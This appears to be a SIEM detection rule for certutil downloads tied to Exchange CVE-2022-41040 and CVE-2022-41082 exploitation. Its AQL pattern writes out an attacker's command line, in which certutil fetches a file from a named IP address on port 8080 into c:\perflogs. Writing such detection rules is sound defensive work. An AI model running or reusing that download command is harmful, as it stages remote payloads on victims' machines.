name: Microsoft Windows RCE Vulnerability - Suspicious Download Using Certutil
notes:
This rule detects Remote Code Execution vulnerabilities in Microsoft Exchange.

Microsoft issued "CVE-2022-41040" and "CVE-2022-41082" Exchange Server.
conditions_text: when the event(s) were detected by one or more of Microsoft Windows Security Event Log
when the event category for the event is one of the following Audit.Command Execution Success
when the event matches Command (custom) is not N/A

when the event matches ("Command") LIKE '%c:\\PerfLogs"&certutil.exe -urlcache -split -f (http://206.188.196.77:8080/themes.aspx c:\perflogs\t|https://httpbin.org/get c:\test)&echo [S]&cd&echo [E]%' AQL filter query
TD_list: APPLY Microsoft Windows RCE Vulnerability - Suspicious Download Using Certutil on events which are detected by the LOCAL system
AND when the event(s) were detected by one or more of Microsoft Windows Security Event Log
AND when the event category for the event is one of the following Audit.Command Execution Success
AND when the event matches Command (custom) is not N/A

AND when the event matches ("Command") LIKE '%c:\\PerfLogs"&certutil.exe -urlcache -split -f  (http://206.188.196.77:8080/themes.aspx c:\perflogs\t|https://httpbin.org/get c:\test)&echo [S]&cd&echo [E]%' AQL filter query
RED_list: Event name: Microsoft Windows RCE Vulnerability - Suspicious Download Using Certutil
Event description: Detects Remote Code Execution vulnerabilities in Microsoft Exchange.
Force the dispatched event to create a NEW offense, select the offense using Source IP
This information should contribute to the name of the associated offense(s)
